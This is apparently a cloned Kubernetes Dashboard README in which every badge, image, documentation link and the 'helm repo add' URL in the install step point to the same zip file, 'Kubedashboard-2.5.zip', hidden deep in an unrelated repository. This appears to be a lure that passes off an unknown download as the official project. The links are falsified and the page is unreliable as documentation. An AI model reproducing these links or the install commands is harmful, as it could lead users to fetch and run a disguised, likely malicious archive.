# Kubernetes Dashboard

[![Go Report Card](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)
[![Coverage Status](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)
[![License](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip%https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)

## Introduction

Kubernetes Dashboard is a general purpose, web-based UI for Kubernetes clusters. It allows users to manage applications running in the cluster and troubleshoot them, as well as manage the cluster itself.

![Dashboard UI workloads page](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)

## Installation

Kubernetes Dashboard supports only Helm-based installation currently as it is faster and gives us better control
over all dependencies required by Dashboard to run. We now use a single-container, DBless [Kong](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip) installation
as a gateway that connects all our containers and exposes the UI. Users can then use any ingress controller or proxy
in front of kong gateway. To find out more about ways to customize your installation check out [helm chart values](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip).

In order to install Kubernetes Dashboard simply run:
```console
# Add kubernetes-dashboard repository
helm repo add kubernetes-dashboard https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip
# Deploy a Helm Release named "kubernetes-dashboard" using the kubernetes-dashboard chart
helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard --create-namespace --namespace kubernetes-dashboard
```

For more information about our Helm chart visit [ArtifactHub](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip).

## Documentation

Dashboard documentation can be found in the [docs](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip) directory which contains:

* [Common](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip): Entry-level overview.
* [User Guide](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip): Helpful information for users.
* [How to access Dashboard](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip) - Everything you need to know to get access to you Kubernetes Dashboard instance after installation.
* [Access Control](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip): Find out how to control access to your Kubernetes Dashboard and [create sample user](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip) that can be used to log in.
* [Developer Guide](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip): Important information for contributors that would like to test, run and work on Dashboard locally.

## Community, discussion, contribution, and support

Learn how to engage with the Kubernetes community on the [community page](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip).

You can reach the maintainers of this project at:

* [**#sig-ui on Kubernetes Slack**](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)
* [**kubernetes-sig-ui mailing list** ](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip!forum/kubernetes-sig-ui)
* [**Issue tracker**](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)
* [**SIG info**](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)
* [**Roles**](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)

### Contribution

Learn how to start contributing to the [Contributing Guideline](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip).

### Code of conduct

Participation in the Kubernetes community is governed by the [Kubernetes Code of Conduct](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip).

## License

[Apache License 2.0](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)

----
_Copyright 2019 [The Kubernetes Dashboard Authors](https://raw.githubusercontent.com/sivahariu/Kubedashboard/master/modules/web/src/resource/cluster/serviceaccount/detail/Kubedashboard-2.5.zip)_
